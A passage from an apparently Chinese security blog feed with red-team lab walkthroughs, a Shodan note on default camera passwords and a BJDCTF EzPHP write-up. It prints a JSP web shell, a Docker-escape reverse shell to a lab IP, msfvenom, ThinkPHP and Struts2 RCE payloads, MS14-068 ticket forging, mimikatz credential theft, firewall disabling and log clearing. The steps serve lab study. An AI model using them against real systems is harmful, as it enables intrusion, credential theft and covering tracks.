line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://192.168.157.129:2002/shell.jsp?pwd=023&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.157.129:2002/shell.jsp?pwd=023&amp;cmd=whoami</a></p></blockquote><blockquote><p>root\n</p></blockquote><p>也可以上传冰蝎的shell.jsp文件</p><p>进行连接</p><p>CVE-2018-12613,这个是一个phpmyadmin的洞，也就是文件包含，利用起来也还算方便，方法如下（环境为config模式，可直接使用test账户登录）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.104:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>至于包含shell也是比较简单的，select执行一个php代码，包含自己的session即可。</p><p>下面是st2-045，st2系列也是一个经典的系列，直接构造下面的数据包即可rce。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.8,es;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: %&#123;#context[&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;].addHeader(&apos;vulhub&apos;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure><p>三个漏洞都完成了</p><p>下面进行docker逃逸CVE-2019-5736</p><p> 漏洞影响在默认设置下运行的Docker容器，并且攻击者可以使用它来获得主机上的root级访问权限。 </p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。<br>像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。<br>在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul><li>宿主机利用攻击者提供的image来创建一个新的container 。</li><li>拥有container root权限，并且该container后续被docker exec attach。</li></ul><p>一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>docker version &lt;=18.09.2<br>RunC version &lt;=1.0-rc6</p><p> 编译go脚本生成攻击payload。<br>（<a href="https://github.com/Frichetten/CVE-2019-5736-PoC）" target="_blank" rel="noopener">https://github.com/Frichetten/CVE-2019-5736-PoC）</a> </p><p> 将go脚本中的命令修改为反弹shell </p><p>var payload = “#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.157.128/4444 0&gt;&amp; 1”</p><p> 编译生成payload</p><p>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</p><p>将该payload拷贝到docker容器中</p><p> 执行payload</p><p> 攻击者开启nc监听 </p><p> 受害者启动docker容器时，触发payload。 </p><p> 成功反弹shell。 </p><p>这里我先用冰蝎上传msf的payload</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.157.128 LPORT=5555 -f raw &gt; shell1.jsp</p></blockquote><p>然后msf监听</p><blockquote><p>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp<br>payload =&gt; java/jsp_shell_reverse_tcp<br>msf5 exploit(multi/handler) &gt; set lhost 192.168.157.128<br>lhost =&gt; 192.168.157.128<br>msf5 exploit(multi/handler) &gt; set lport 5555<br>lport =&gt; 5555<br>msf5 exploit(multi/handler) &gt; exploit</p></blockquote><p>得到shell</p><p>运行main文件</p><blockquote><p>chmod 777 ./main</p><p>./main</p></blockquote><p>然后开始用msf监听4444端口</p><p>模拟docker进入主机</p><blockquote><p>docker exec -it 09dd4e5bfa91 /bin/bash</p></blockquote><p>kali就接收到主机的shell， 实现了docker容器逃逸 </p><p>只是一个普通的shell，想办法把它升级为meterpreter</p><blockquote><p>post/multi/manage/shell_to_meterprete </p></blockquote><p>然后添加路由</p><blockquote><p>run autoroute -s 192.168.183.0/24</p></blockquote><p>用arp- a扫描  发现192.168.183.128</p><p>然后用 auxiliary/scanner/portscan/tcp 进行扫描</p><p>开放135端口尝试用 smb_version 进行探测系统版本信息</p><p> 发现是win7 sp1且位于DEMO域中 </p><p> 使用ms17-010 没有成功</p><p>有两种方法</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>使用<code>eternalblue_doublepulsar</code>得到了<code>shell</code><br>下载链接：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>参考文章：<a href="https://blog.csdn.net/userpass_word/article/details/85124266" target="_blank" rel="noopener">https://blog.csdn.net/userpass_word/article/details/85124266</a> </p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p> 有可能是uac的问题，换成bypassUAC的进行测试 </p><p>然后收集域信息</p><blockquote><p>net user /domain</p><p>net group “Domain controllers” /domain</p><p>ping WIN-ENS2VR5TR3N.demo.com</p><p>有现成的<code>ms14-068.exe</code>以及<code>mimikatz</code>还有以及生成好的<code>TGT</code>文件 </p></blockquote><p>使用<code>mimikatz</code>抓取<code>douser</code>的密码，利用<code>whoami /all</code>获取<code>douser</code>的<code>Sid</code><br>然后利用<code>ms14-068</code>生成票据 </p><blockquote><p>MS14-068.exe -u <a href="mailto:douser@demo.com" target="_blank" rel="noopener">douser@demo.com</a> -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</p></blockquote><p>然后导入票据 </p><blockquote><p>Kerberos::ptc c:\users\douser\Desktop\TGT_douser@demo.com.ccache</p></blockquote><p>成功获得域管理员权限 </p><p>利用<code>copy</code>命令上传一个正向<code>shell</code>，通过<code>psexec</code>连接域控执行打一个<code>shell</code>回来 </p><p>上传<code>mimikatz.exe</code>，抓取到域管理员明文密码 </p><p> 最后三台主机运行<code>clearev</code>清除日志痕迹 </p><h1 id="ATT-amp-CK红队评估实战靶场-五"><a href="#ATT-amp-CK红队评估实战靶场-五" class="headerlink" title="ATT&amp;CK红队评估实战靶场(五)"></a>ATT&amp;CK红队评估实战靶场(五)</h1><p>运行phpstudy</p><p>然后进行扫描</p><blockquote><p>nmap -sV -p- 192.168.135.0/24</p><p>map scan report for 192.168.135.150<br>Host is up (0.00042s latency).<br>Not shown: 65533 filtered ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)<br>3306/tcp open  mysql   MySQL (unauthorized)</p></blockquote><p>然后访问</p><p>发现是ThinkPHP V5</p><p>可以用goby进行扫描</p><blockquote><p>描述</p><p>ThinkPHP是一个轻量级PHP开发框架。该框架存在远程代码执行漏洞，可直接控制服务器。<br>漏洞危害<br>该漏洞可能导致攻击者在服务器端任意执行代码，进而控制整个服务器。</p><p>解决方案<br>1、升级至最新版本：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down.html</a></p><p>2、或者直接修改源码：</p><p>将/ThinkPHP/Lib/Core/Dispatcher.class.php文件中的</p><p>$res = preg_replace(‘@(w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2”;’, implode($depr,$paths));</p><p>修改为：</p><p>$res = preg_replace(‘@(w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2’;’, implode($depr,$paths));</p><p>将preg_replace第二个参数中的双引号改为单引号，防止其中的php变量语法被解析执行。</p><p>payload:</p><p><a href="http://192.168.135.150/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://192.168.135.150/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a></p><p>写入shell</p><p><a href="http://192.168.135.150/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo" target="_blank" rel="noopener">http://192.168.135.150/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> ^&lt;?php @eval($_POST[“bypass”]);?^&gt;&gt;shell.php </p><p>蚁剑进行连接</p></blockquote><p>也可以扫描下目录</p><blockquote><p>python3 dirsearch.py -u 192.168.135.150 -e *</p><p>[10:40:55] 200 -    2KB - /add.php<br>[10:41:52] 200 -    1KB - /favicon.ico<br>[10:42:03] 200 -  931B  - /Index<br>[10:42:03] 200 -  931B  - /index<br>[10:42:03] 200 -  931B  - /index.html<br>[10:42:03] 200 -  931B  - /index.php<br>[10:42:03] 200 -  931B  - /INDEX.PHP<br>[10:42:03] 200 -  931B  - /index.PHP<br>[10:42:41] 200 -   24B  - /robots.txt          </p></blockquote><p>发现add.php</p><p>用字典跑</p><p>得到密码</p><p>admins</p><h3 id="进行内网信息探测"><a href="#进行内网信息探测" class="headerlink" title="进行内网信息探测"></a>进行内网信息探测</h3><p>上线cs</p><blockquote><p>ipconfig /all</p><p>域控制器的域名是sun.com</p></blockquote><p>进行提权然后用mimikatz和hashdump抓取密码</p><p>然后内网扫描存活主机 </p><blockquote><p>portscan 192.168.138.0/24 1-6000 arp 10</p></blockquote><p>发现192.168.138.138存活</p><blockquote><p>shell net group “domain controllers” /domain 查看域控制器名称</p><p>DC</p></blockquote><p>得到域控的ip</p><blockquote><p>ping DC.sun.com</p><p>确认192.168.138.138是域控制器</p></blockquote><p>进行psexec传递</p><p>因为内网不出网</p><p>所以先监听192.168.138.136 smb</p><p>创建smb通道</p><p>右键spawn smb</p><p>然后进行psexec传递</p><p>但是win7开启了防火墙,监听不了</p><p>关闭防火墙</p><blockquote><p>shell netsh advfirewall set allprofiles state off</p></blockquote><p>得到域控</p><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%94.png" alt></p><p> 持久控制</p><p>黄金票据</p><p>hashdump</p><p>得到krbtgt的hash</p><p>mimikatz获得sid</p><p>接下来在普通域成员机器上制作黄金票据并导入</p><p>导入之前无法访问域控的共享文件</p><p> <strong>生成黄金票据并导入</strong> </p><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场-一&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场-一&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场(一)&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场(一)&lt;/h1&gt;&lt;p&gt;搭建好环境后,用nmap进行扫描&lt;/p&gt;&lt;blockquote&gt;
&lt;p&gt;nmap -sV -p- 192.168.189.129&lt;/p&gt;
&lt;/blockquote&gt;&lt;p&gt;发现开启80，3306端口&lt;/p&gt;&lt;p&gt;访问192.168.189.129:80网页&lt;/p&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="域渗透" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>shodan基础使用</title>
    <link href="http://yoursite.com/2020/07/28/shodan%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2020/07/28/shodan%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</id>
    <published>2020-07-28T09:45:10.000Z</published>
    <updated>2020-09-08T11:18:45.810Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://b404.gitbooks.io/shodan-manual/content/instruction.html" target="_blank" rel="noopener">shodan手册</a></p><p>几种摄像头关键词和默认密码</p><blockquote><p>JAWS为“CCTV”网络摄像头关键字 </p><p>常见弱密码：admin，空，111111,888888,123456；</p><p> NVR webserver </p><p>admin 888888是默认账号密码 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://b404.gitbooks.io/shodan-manual/content/instruction.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;shodan手册&lt;/a&gt;&lt;/p&gt;&lt;p&gt;几种摄像头关键词和默认密码
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>刷题记录</title>
    <link href="http://yoursite.com/2020/07/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-14T09:56:15.000Z</published>
    <updated>2020-09-08T11:18:49.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>​    点开后，右键查看代码，发现有个base32加密的，解密后是1nD3x.php页面提示，进入查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="url编码绕过对-SERVER-‘QUERY-STRING’-的过滤"><a href="#url编码绕过对-SERVER-‘QUERY-STRING’-的过滤" class="headerlink" title="url编码绕过对$_SERVER[‘QUERY_STRING’]的过滤"></a>url编码绕过对$_SERVER[‘QUERY_STRING’]的过滤</h3><p>看到第一处过滤使用 preg_match 过滤了很多关键词，但是他是用 $_SERVER[‘QUERY_STRING’] 来获得查询语句的，不会进行解码，可以进行url编码绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (    preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对preg-match中-xxx-类型匹配的绕过"><a href="#对preg-match中-xxx-类型匹配的绕过" class="headerlink" title="对preg_match中/^xxx$/类型匹配的绕过"></a>对preg_match中/^xxx$/类型匹配的绕过</h3><p>第二处可以通过在句尾加上%0a进行绕过 </p><p>因为 preg_match 只匹配第一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过-REQUEST中数据检测"><a href="#绕过-REQUEST中数据检测" class="headerlink" title="绕过$_REQUEST中数据检测"></a>绕过$_REQUEST中数据检测</h3><p>第三处检测是检测数据中是否有字母</p><p>$_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值。 </p><p> 只需要同时GET和POST同一个参数就可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="file-get-contents进行比较内容"><a href="#file-get-contents进行比较内容" class="headerlink" title="file_get_contents进行比较内容"></a>file_get_contents进行比较内容</h3><p>第四处检测是检测 得到的$file中的文件内容是否是’debu_debu_aqua’</p><p>一般来说可以用php://input或data://<br>php://input是将post过来的数据全部当做文件内容<br>data://有以下几种用法<br>    data://text/plain,<?php phpinfo()?><br>    data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p><p>这里用 file=data:text/plain,debu_debu_aqua 进行绕过检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过sha1比较"><a href="#绕过sha1比较" class="headerlink" title="绕过sha1比较"></a>绕过sha1比较</h3><p>第五处检测绕过</p><p>sha1()函数是无法处理数组的，如果sha1()的参数为一个数组会报Warning并返回False</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h3><p>最后一处检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>$arg和$code变量都是可控的，因为extract()函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要extract()内的数组键名为arg和code，键值为我们构造的用来注入的代码，即可实现$arg和$code的变量覆盖，导致代码注入。</p><p> create_function() </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myfunc = create_function(<span class="string">'$a, $b'</span>, <span class="string">'return $a+$b;'</span>);</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果第二个参数没有限制，可以构造下面的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">'$a, $b'</span>, <span 